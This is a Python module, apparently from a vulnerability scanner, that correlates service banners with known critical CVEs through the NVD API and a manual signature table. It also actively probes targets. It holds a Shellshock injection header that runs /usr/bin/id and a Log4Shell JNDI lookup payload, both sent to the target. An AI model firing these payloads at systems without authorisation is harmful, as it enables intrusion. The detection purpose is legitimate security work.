# vuln_assessment.py
from __future__ import annotations

import re
from urllib.parse import quote_plus

from .utils import ScanContext, add_finding, add_warning, get_url, post_url


MANUAL_CVES = [
    ("smbv1",            "CVE-2017-0144",   9.8,  "EternalBlue: SMBv1 remote code execution (WannaCry)",                      "https://nvd.nist.gov/vuln/detail/CVE-2017-0144"),
    ("smbv1",            "CVE-2017-0145",   9.8,  "EternalRomance: SMBv1 remote code execution",                               "https://nvd.nist.gov/vuln/detail/CVE-2017-0145"),
    ("bluekeep",         "CVE-2019-0708",   9.8,  "BlueKeep: RDP pre-auth remote code execution",                              "https://nvd.nist.gov/vuln/detail/CVE-2019-0708"),
    ("rdp nla",          "CVE-2019-0708",   9.8,  "BlueKeep: RDP pre-auth RCE (NLA disabled increases exposure)",              "https://nvd.nist.gov/vuln/detail/CVE-2019-0708"),
    ("dejavublue",       "CVE-2019-1181",   9.8,  "DejaBlue: RDP remote code execution",                                       "https://nvd.nist.gov/vuln/detail/CVE-2019-1181"),
    ("openssh 7.",       "CVE-2016-0777",   8.1,  "OpenSSH roaming information disclosure",                                    "https://nvd.nist.gov/vuln/detail/CVE-2016-0777"),
    ("openssh 8.0",      "CVE-2023-38408",  9.8,  "OpenSSH ssh-agent RCE via forwarded agent",                                 "https://nvd.nist.gov/vuln/detail/CVE-2023-38408"),
    ("openssh 9.0",      "CVE-2023-38408",  9.8,  "OpenSSH ssh-agent RCE via forwarded agent",                                 "https://nvd.nist.gov/vuln/detail/CVE-2023-38408"),
    ("heartbleed",       "CVE-2014-0160",   7.5,  "Heartbleed: OpenSSL heartbeat information disclosure",                      "https://nvd.nist.gov/vuln/detail/CVE-2014-0160"),
    ("openssl 1.0",      "CVE-2014-0160",   7.5,  "Heartbleed: OpenSSL 1.0.1 heartbeat information disclosure",                "https://nvd.nist.gov/vuln/detail/CVE-2014-0160"),
    ("shellshock",       "CVE-2014-6271",   9.8,  "Shellshock: GNU Bash environment variable code injection",                  "https://nvd.nist.gov/vuln/detail/CVE-2014-6271"),
    ("cgi-bin",          "CVE-2014-6271",   9.8,  "Shellshock: CGI scripts may be vulnerable to Bash injection",               "https://nvd.nist.gov/vuln/detail/CVE-2014-6271"),
    ("log4shell",        "CVE-2021-44228",  10.0, "Log4Shell: Apache Log4j2 JNDI remote code execution",                       "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"),
    ("log4j",            "CVE-2021-44228",  10.0, "Log4Shell: Apache Log4j2 JNDI RCE",                                         "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"),
    ("log4j",            "CVE-2021-45046",  9.0,  "Log4j2 incomplete CVE-2021-44228 fix, context lookup bypass",               "https://nvd.nist.gov/vuln/detail/CVE-2021-45046"),
    ("spring4shell",     "CVE-2022-22965",  9.8,  "Spring4Shell: Spring Framework data binding RCE",                           "https://nvd.nist.gov/vuln/detail/CVE-2022-22965"),
    ("spring framework", "CVE-2022-22965",  9.8,  "Spring Framework RCE via class loader manipulation",                        "https://nvd.nist.gov/vuln/detail/CVE-2022-22965"),
    ("spring boot",      "CVE-2022-22963",  9.8,  "Spring Cloud Function SpEL injection RCE",                                  "https://nvd.nist.gov/vuln/detail/CVE-2022-22963"),
    ("confluence",       "CVE-2022-26134",  10.0, "Confluence Server OGNL injection RCE (unauthenticated)",                    "https://nvd.nist.gov/vuln/detail/CVE-2022-26134"),
    ("confluence",       "CVE-2023-22515",  10.0, "Confluence broken access control — create admin account",                   "https://nvd.nist.gov/vuln/detail/CVE-2023-22515"),
    ("apache 2.4",       "CVE-2021-41773",  9.8,  "Apache HTTP Server 2.4.49 path traversal + RCE",                            "https://nvd.nist.gov/vuln/detail/CVE-2021-41773"),
    ("apache 2.4.49",    "CVE-2021-41773",  9.8,  "Apache HTTP 2.4.49 path traversal RCE",                                     "https://nvd.nist.gov/vuln/detail/CVE-2021-41773"),
    ("citrix",           "CVE-2019-19781",  9.8,  "Citrix ADC directory traversal / RCE",                                      "https://nvd.nist.gov/vuln/detail/CVE-2019-19781"),
    ("f5 big-ip",        "CVE-2020-5902",   9.8,  "F5 BIG-IP TMUI RCE (unauthenticated)",                                      "https://nvd.nist.gov/vuln/detail/CVE-2020-5902"),
    ("vmware",           "CVE-2021-22005",  9.8,  "VMware vCenter Server file upload RCE",                                     "https://nvd.nist.gov/vuln/detail/CVE-2021-22005"),
    ("wordpress",        "CVE-2019-8943",   8.8,  "WordPress image path traversal leading to RCE",                             "https://nvd.nist.gov/vuln/detail/CVE-2019-8943"),
    ("redis",            "CVE-2022-0543",   10.0, "Redis Lua sandbox escape leading to RCE",                                   "https://nvd.nist.gov/vuln/detail/CVE-2022-0543"),
    ("exchange",         "CVE-2021-26855",  9.8,  "Microsoft Exchange ProxyLogon SSRF + RCE",                                  "https://nvd.nist.gov/vuln/detail/CVE-2021-26855"),
    ("exchange",         "CVE-2022-41082",  8.8,  "Microsoft Exchange ProxyNotShell remote code execution",                    "https://nvd.nist.gov/vuln/detail/CVE-2022-41082"),
    ("kubernetes",       "CVE-2018-1002105",9.8,  "Kubernetes API server privilege escalation",                                "https://nvd.nist.gov/vuln/detail/CVE-2018-1002105"),
    ("kubelet",          "CVE-2020-8558",   8.8,  "Kubernetes kubelet API exposed without auth",                               "https://nvd.nist.gov/vuln/detail/CVE-2020-8558"),
    ("jenkins",          "CVE-2019-1003000",9.9,  "Jenkins Script Security sandbox bypass RCE",                                "https://nvd.nist.gov/vuln/detail/CVE-2019-1003000"),
    ("gitlab",           "CVE-2021-22205",  10.0, "GitLab ExifTool image upload RCE (unauthenticated)",                        "https://nvd.nist.gov/vuln/detail/CVE-2021-22205"),
    ("openssh",          "CVE-2024-6387",   9.8,  "regreSSHion: OpenSSH < 9.8 async signal safety RCE",                       "https://nvd.nist.gov/vuln/detail/CVE-2024-6387"),
]

SHELLSHOCK_HEADER = "() { ignored; }; echo; /usr/bin/id"
SHELLSHOCK_PATHS  = ["/cgi-bin/test.cgi", "/cgi-bin/printenv.pl", "/cgi-bin/index.cgi", "/cgi-sys/defaultwebpage.cgi"]
LOG4SHELL_PAYLOAD = "${jndi:ldap://log4shell-test.malak-scanner.invalid/a}"


def run(ctx: ScanContext, console) -> None:
    tick = getattr(ctx, "_tick", None)

    if tick:
        tick(f"NVD API lookup ({len(ctx.open_ports)} service banners)")
    _nvd(ctx, console)

    if tick:
        tick(f"Manual CVE correlation ({len(MANUAL_CVES)} signatures)")
    _manual(ctx)

    if tick:
        tick("Active probe — Shellshock (CVE-2014-6271)")
    _probe_shellshock(ctx, console)

    if tick:
        tick("Active probe — Log4Shell (CVE-2021-44228)")
    _probe_log4shell(ctx, console)


def _nvd(ctx: ScanContext, console) -> None:
    seen: set[str] = set()
    for port in ctx.open_ports:
        service = " ".join(filter(None, [
            port.get("service", ""),
            port.get("version", ""),
        ])).strip()
        if not service or service in seen or len(service) < 4:
            continue
        seen.add(service)
        try:
            url = (
                f"https://services.nvd.nist.gov/rest/json/cves/2.0"
                f"?keywordSearch={quote_plus(service)}&resultsPerPage=5"
            )
            response = get_url(url, timeout=20)
            if not response.ok:
                continue
            data = response.json()
            for vuln in data.get("vulnerabilities", []):
                cve_obj = vuln.get("cve", {})
                metrics = cve_obj.get("metrics", {})
                score, severity, vector = None, "", ""
                for key in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
                    entries = metrics.get(key, [])
                    if entries:
                        cvss_data = entries[0].get("cvssData", {})
                        score    = cvss_data.get("baseScore")
                        severity = cvss_data.get("baseSeverity") or entries[0].get("baseSeverity", "")
                        vector   = cvss_data.get("vectorString", "")
                        break
                descriptions = cve_obj.get("descriptions", [])
                description  = next((d["value"] for d in descriptions if d.get("lang") == "en"), "")
                cve_id       = cve_obj.get("id", "")
                ctx.cves.append({
                    "id":          cve_id,
                    "service":     service,
                    "cvss":        score or "",
                    "severity":    severity,
                    "vector":      vector,
                    "description": description[:400],
                    "published":   cve_obj.get("published", ""),
                    "modified":    cve_obj.get("lastModified", ""),
                    "link":        f"https://nvd.nist.gov/vuln/detail/{cve_id}",
                })
        except Exception as exc:
            add_warning(ctx, console, f"NVD lookup failed for '{service}': {exc}")


def _manual(ctx: ScanContext) -> None:
    evidence_blob    = " ".join([f.name + " " + f.evidence for f in ctx.findings]).lower()
    notes_blob       = " ".join([str(n) for n in ctx.service_notes]).lower()
    technologies_blob = " ".join(ctx.technologies).lower()
    blob             = f"{evidence_blob}\n{notes_blob}\n{technologies_blob}"

    already_added: set[str] = {c["id"] for c in ctx.cves}
    for marker, cve_id, cvss, description, link in MANUAL_CVES:
        if cve_id in already_added:
            continue
        if marker.lower() in blob:
            ctx.cves.append({
                "id":          cve_id,
                "service":     marker,
                "cvss":        cvss,
                "severity":    _cvss_to_severity(cvss),
                "vector":      "",
                "description": description,
                "published":   "",
                "modified":    "",
                "link":        link,
            })
            already_added.add(cve_id)


def _probe_shellshock(ctx: ScanContext, console) -> None:
    if not ctx.base_url:
        return
    for path in SHELLSHOCK_PATHS:
        url = ctx.base_url.rstrip("/") + path
        try:
            response = get_url(
                url,
                headers={
                    "User-Agent": SHELLSHOCK_HEADER,
                    "Referer":    SHELLSHOCK_HEADER,
                    "Cookie":     f"test={SHELLSHOCK_HEADER}",
                },
                timeout=12,
            )
            if re.search(r"uid=\d+\(\w+\)\s+gid=", response.text):
                add_finding(
                    ctx, "Command Injection",
                    f"Shellshock probe: /usr/bin/id output found in response from {url}\n"
                    f"Body: {response.text[:500]}",
                    category="Web",
                    name="Shellshock CGI RCE",
                    cve="CVE-2014-6271",
                    references=["https://nvd.nist.gov/vuln/detail/CVE-2014-6271"],
                )
                return
        except Exception:
            continue


def _probe_log4shell(ctx: ScanContext, console) -> None:
    if not ctx.base_url:
        return
    headers_to_fuzz = {
        "X-Api-Version":   LOG4SHELL_PAYLOAD,
        "User-Agent":      LOG4SHELL_PAYLOAD,
        "X-Forwarded-For": LOG4SHELL_PAYLOAD,
        "Referer":         ctx.base_url + "?" + LOG4SHELL_PAYLOAD,
        "Accept-Language": LOG4SHELL_PAYLOAD,
    }
    try:
        response = get_url(ctx.base_url, headers=headers_to_fuzz, timeout=12)
        if re.search(r"jndi|ldap://|javax\.naming", response.text, re.I):
            add_finding(
                ctx, "Command Injection",
                f"Log4Shell probe: Response from {ctx.base_url} contains JNDI/LDAP-related text after payload injection.\n"
                f"This is a strong indicator — verify with a callback server (e.g., Interactsh).\n"
                f"Body snippet: {response.text[:500]}",
                category="Web",
                name="Log4Shell indicator (verify with OOB callback)",
                cve="CVE-2021-44228",
                references=["https://nvd.nist.gov/vuln/detail/CVE-2021-44228"],
            )
    except Exception:
        pass


def _cvss_to_severity(score: float) -> str:
    if score >= 9.0:
        return "Critical"
    if score >= 7.0:
        return "High"
    if score >= 4.0:
        return "Medium"
    if score > 0:
        return "Low"
    return "Info"